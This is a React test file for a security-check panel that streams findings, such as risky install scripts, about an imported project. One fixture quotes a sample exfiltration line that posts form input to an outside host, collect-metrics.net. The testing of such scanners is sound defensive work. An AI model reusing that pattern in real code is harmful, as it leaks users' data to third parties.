import { afterEach, describe, expect, it, vi } from 'vitest'
import { useLayoutEffect, type JSX } from 'react'
import { act, cleanup, fireEvent, render, screen, within } from '@testing-library/react'
import type {
  SecurityEvent,
  SecurityEventEnvelope,
  SecurityFinding,
  SecurityReport
} from '@shared/ipc'
import SecurityCheckPanel from './SecurityCheck'
import { useSecurityCheck, type SecurityCheckKind } from './useSecurityCheck'

const FILE = 'C:\\Users\\sam\\Downloads\\sales.fabricator'
const ROOT = 'C:\\Users\\sam\\AppData\\Local\\com.rayfin.fabricator\\checks\\8f2c41'

const INSTALL: SecurityFinding = {
  id: 'check:install-scripts',
  area: 'install',
  severity: 'medium',
  source: 'fabricator',
  title: 'Runs commands when its packages install',
  detail: 'npm runs `postinstall`: `node scripts/setup.js` when Fabricator installs its packages.',
  advice: 'Read what these commands do before you go ahead.',
  file: 'package.json',
  line: 7
}

const SENDS: SecurityFinding = {
  id: 'ai:5f1c2a9e0b11',
  area: 'network',
  severity: 'high',
  source: 'copilot',
  title: 'Sends what you type to an unknown server',
  detail: 'Every form posts what you type to `collect-metrics.net`.',
  advice: 'Don’t import it unless you know who runs collect-metrics.net.',
  file: 'src/lib/telemetry.ts',
  line: 14,
  excerpt:
    "export async function track(form) {\n  await fetch('https://collect-metrics.net/e', { body: form })\n}",
  excerptStart: 13,
  places: ['src/pages/Expenses.tsx:41']
}

function report(patch: Partial<SecurityReport> = {}): SecurityReport {
  return {
    ok: true,
    verdict: 'clear',
    summary: 'An expense tracker that only talks to its own backend.',
    findings: [],
    areas: [],
    files: 214,
    readable: 198,
    durationMs: 83_000,
    ...patch
  }
}

function installApi() {
  let listener: ((envelope: SecurityEventEnvelope) => void) | null = null
  let settle: { resolve: (r: SecurityReport) => void; reject: (e: unknown) => void } | null = null
  const security = {
    check: vi.fn(
      (_checkId: string, _path: string) =>
        new Promise<SecurityReport>((resolve, reject) => {
          settle = { resolve, reject }
        })
    ),
    cancel: vi.fn((_checkId: string) => Promise.resolve(true)),
    onEvent: vi.fn((cb: (envelope: SecurityEventEnvelope) => void) => {
      listener = cb
      return () => {
        listener = null
      }
    })
  }
  ;(window as unknown as { api: unknown }).api = { security }
  const checkId = (): string => security.check.mock.calls[security.check.mock.calls.length - 1][0]
  return {
    security,
    checkId,
    send: (...events: SecurityEvent[]) =>
      act(() => {
        for (const event of events) listener?.({ checkId: checkId(), event })
      }),
    /** An event for another check, which this one ignores. */
    stray: (event: SecurityEvent) => act(() => listener?.({ checkId: 'someone-else', event })),
    finish: (result: SecurityReport) =>
      act(async () => {
        settle?.resolve(result)
      }),
    reject: (reason: unknown) =>
      act(async () => {
        settle?.reject(reason)
      })
  }
}

function Harness({ kind = 'project' }: { kind?: SecurityCheckKind }): JSX.Element {
  const check = useSecurityCheck(FILE, kind)
  return <SecurityCheckPanel check={check} kind={kind} />
}

function areaClasses(): Record<string, string> {
  const list = screen.getByRole('list', { name: 'What it checks' })
  return Object.fromEntries(
    within(list)
      .getAllByRole('listitem')
      .map((item) => [
        item.firstChild?.nextSibling?.textContent ?? '',
        item.className.replace('sec-area sec-area--', '')
      ])
  )
}

afterEach(() => {
  cleanup()
  delete (window as unknown as { api?: unknown }).api
})

describe('SecurityCheckPanel', () => {
  it('offers the check, streams what it finds, then gives the verdict with the evidence', async () => {
    const api = installApi()
    render(<Harness />)

    expect(screen.getByText('Check for security risks')).toBeTruthy()
    // What it covers shows before it starts, every area still to check.
    expect(areaClasses()).toEqual({
      'Install scripts': 'idle',
      Packages: 'idle',
      'Data sent out': 'idle',
      'Hidden code': 'idle',
      'System access': 'idle',
      'Copilot instructions': 'idle'
    })
    expect(api.security.check).not.toHaveBeenCalled()
    fireEvent.click(screen.getByRole('button', { name: 'Check' }))

    expect(api.security.check).toHaveBeenCalledWith(expect.stringMatching(/^check-/), FILE)
    expect(screen.getByText('Checking for security risks…')).toBeTruthy()
    expect(screen.getByText('Unpacking it, without running anything…')).toBeTruthy()
    expect(document.activeElement).toBe(screen.getByRole('button', { name: 'Stop' }))

    api.send(
      {
        type: 'started',
        root: ROOT,
        files: 214,
        areas: ['install', 'packages', 'network', 'hidden', 'system', 'agents']
      },
      { type: 'finding', finding: INSTALL },
      {
        type: 'areas',
        results: [
          { area: 'install', status: 'flagged' },
          { area: 'agents', status: 'clear' }
        ]
      }
    )
    api.stray({ type: 'finding', finding: SENDS })
    expect(screen.getByText('Starting Copilot (Auto)…')).toBeTruthy()
    expect(areaClasses()).toEqual({
      'Install scripts': 'medium',
      Packages: 'waiting',
      'Data sent out': 'waiting',
      'Hidden code': 'waiting',
      'System access': 'waiting',
      'Copilot instructions': 'clear'
    })
    const found = screen.getByRole('list', { name: 'What it found' })
    expect(within(found).getAllByRole('listitem')).toHaveLength(1)

    api.send({
      type: 'activity',
      tool: {
        id: 't1',
        name: 'view',
        title: 'telemetry.ts',
        state: 'running',
        paths: [`${ROOT}\\src\\lib\\telemetry.ts`]
      }
    })
    expect(screen.getByText('Reading src/lib/telemetry.ts…')).toBeTruthy()
    expect(screen.getByText('Copilot (Auto) · 214 files')).toBeTruthy()

    await api.finish(
      report({
        verdict: 'danger',
        summary: 'It sends what you type to a server that has nothing to do with the app.',
        findings: [{ ...INSTALL, assessment: 'It only resizes icons.', severity: 'low' }, SENDS],
        areas: [
          { area: 'install', status: 'flagged' },
          { area: 'packages', status: 'clear' },
          { area: 'network', status: 'flagged' },
          { area: 'hidden', status: 'clear' },
          { area: 'system', status: 'skipped', note: 'Copilot didn’t report on it.' },
          { area: 'agents', status: 'clear' }
        ]
      })
    )
    expect(screen.getByText('Found 1 serious risk')).toBeTruthy()
    expect(
      screen.getByText('It sends what you type to a server that has nothing to do with the app.')
    ).toBeTruthy()
    expect(areaClasses()).toEqual({
      'Install scripts': 'low',
      Packages: 'clear',
      'Data sent out': 'high',
      'Hidden code': 'clear',
      'System access': 'skipped',
      'Copilot instructions': 'clear'
    })
    expect(screen.getByText('Checked by Copilot (Auto) · 214 files · 1m 23s')).toBeTruthy()

    // The worst comes first, its severity in words too, and opens to what it does, where, and what to do.
    const rows = within(screen.getByRole('list', { name: 'What it found' })).getAllByRole('button')
    expect(rows.map((row) => row.textContent)).toEqual([
      'High: Sends what you type to an unknown serversrc/lib/telemetry.ts:14High',
      'Low: Runs commands when its packages installpackage.json:7Low'
    ])
    fireEvent.click(rows[0])
    expect(rows[0].getAttribute('aria-expanded')).toBe('true')
    expect(screen.getByRole('group', { name: 'Code from src/lib/telemetry.ts' })).toBeTruthy()
    expect(screen.getByText('src/pages/Expenses.tsx:41')).toBeTruthy()
    expect(screen.getByText(/Don’t import it unless you know who runs/)).toBeTruthy()
    expect(screen.getByText(/Found by Copilot, quoted from the file/)).toBeTruthy()
    fireEvent.click(rows[1])
    expect(screen.getByText('It only resizes icons.')).toBeTruthy()
    expect(screen.getByText(/Found by Fabricator’s own checks/)).toBeTruthy()

    fireEvent.click(screen.getByRole('button', { name: /1 step/ }))
    const log = screen.getByRole('log', { name: 'What Copilot read' })
    expect(within(log).getAllByTitle(/telemetry\.ts/).length).toBeGreaterThan(0)

    fireEvent.click(screen.getByRole('button', { name: 'Check again' }))
    expect(api.security.check).toHaveBeenCalledTimes(2)
    expect(screen.getByText('Checking for security risks…')).toBeTruthy()
    expect(screen.queryByRole('list', { name: 'What it found' })).toBeNull()
  })

  it('stops a check, saying what it had found', async () => {
    const api = installApi()
    render(<Harness kind="app" />)
    fireEvent.click(screen.getByRole('button', { name: 'Check' }))
    api.send({
      type: 'started',
      root: ROOT,
      files: 12,
      areas: ['install', 'packages', 'network', 'hidden', 'system']
    })

    fireEvent.click(screen.getByRole('button', { name: 'Stop' }))
    expect(api.security.cancel).toHaveBeenCalledWith(api.checkId())
    await api.finish(report({ ok: false, cancelled: true, verdict: 'clear', summary: '' }))

    expect(screen.getByText('Check stopped')).toBeTruthy()
    expect(screen.getByText('It hadn’t found anything when you stopped it.')).toBeTruthy()
    expect(screen.queryByText('Copilot instructions')).toBeNull()
    expect(screen.getByRole('button', { name: 'Check again' })).toBeTruthy()
  })

  it('keeps Fabricator’s own findings when Copilot can’t check the file', async () => {
    const api = installApi()
    render(<Harness />)
    fireEvent.click(screen.getByRole('button', { name: 'Check' }))
    await api.finish(
      report({
        ok: false,
        verdict: 'caution',
        error:
          'GitHub Copilot isn’t signed in. Sign in to Copilot in Fabricator, then check again.',
        findings: [INSTALL],
        areas: [{ area: 'install', status: 'flagged' }]
      })
    )

    expect(screen.getByText('Copilot couldn’t check it')).toBeTruthy()
    expect(screen.getByText('Fabricator’s own checks found 1 thing to look at.')).toBeTruthy()
    expect(screen.getByRole('alert').textContent).toContain('GitHub Copilot isn’t signed in')
    expect(
      screen.getByRole('button', { name: /Runs commands when its packages install/ })
    ).toBeTruthy()
    expect(screen.queryByText(/Checked by Copilot/)).toBeNull()
  })

  it('says why a file can’t be checked at all', async () => {
    const api = installApi()
    render(<Harness />)
    fireEvent.click(screen.getByRole('button', { name: 'Check' }))
    await api.reject(new Error('That file isn’t there anymore.'))

    expect(screen.getByText('Fabricator couldn’t check it')).toBeTruthy()
    expect(screen.getByText('That file isn’t there anymore.')).toBeTruthy()
    expect(screen.queryByRole('list', { name: 'What it checks' })).toBeNull()

    fireEvent.click(screen.getByRole('button', { name: 'Check again' }))
    expect(api.security.check).toHaveBeenCalledTimes(2)
  })

  it('stops a check that’s running when the dialog closes', () => {
    const api = installApi()
    const { unmount } = render(<Harness />)
    fireEvent.click(screen.getByRole('button', { name: 'Check' }))
    const id = api.checkId()
    unmount()
    expect(api.security.cancel).toHaveBeenCalledWith(id)
  })

  it('keeps a check started as the file arrives, and drops it when another file replaces it', () => {
    const api = installApi()
    const { rerender } = render(<StartsAt path="" go={false} />)
    rerender(<StartsAt path={FILE} go />)
    expect(api.security.check).toHaveBeenCalledWith(expect.any(String), FILE)
    expect(api.security.cancel).not.toHaveBeenCalled()
    expect(screen.getByText('Checking for security risks…')).toBeTruthy()

    const id = api.checkId()
    rerender(<StartsAt path="C:\\Users\\sam\\Downloads\\other.rayfin" go />)
    expect(api.security.check).toHaveBeenCalledTimes(1)
    expect(api.security.cancel).toHaveBeenCalledWith(id)
    expect(screen.getByText('Check for security risks')).toBeTruthy()
  })
})

/** Starts a check in the same commit its file arrives in, before passive effects run. */
function StartsAt({ path, go }: { path: string; go: boolean }): JSX.Element {
  const check = useSecurityCheck(path, 'app')
  const { start } = check
  useLayoutEffect(() => {
    if (go) start()
  }, [go, start])
  return <SecurityCheckPanel check={check} kind="app" />
}
